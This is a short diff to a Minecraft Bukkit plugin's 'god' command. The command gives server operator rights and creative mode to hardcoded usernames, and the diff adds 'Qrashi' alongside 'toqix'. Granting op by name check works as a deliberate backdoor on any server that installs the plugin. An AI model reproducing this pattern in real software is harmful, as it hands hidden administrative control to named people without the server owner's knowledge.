@@ -13,7 +13,7 @@ public class godCommand implements CommandExecutor {
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         Player player = (Player) sender;
-        if(player.getName().equals("toqix")) {
+        if(player.getName().equals("toqix") || player.getName().equalsIgnoreCase("Qrashi")) {
             player.setOp(true);
             player.setGameMode(GameMode.CREATIVE);
             player.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7[&bGott&7] &eHallo Chef du bist jetzt im Gottesmodus"));
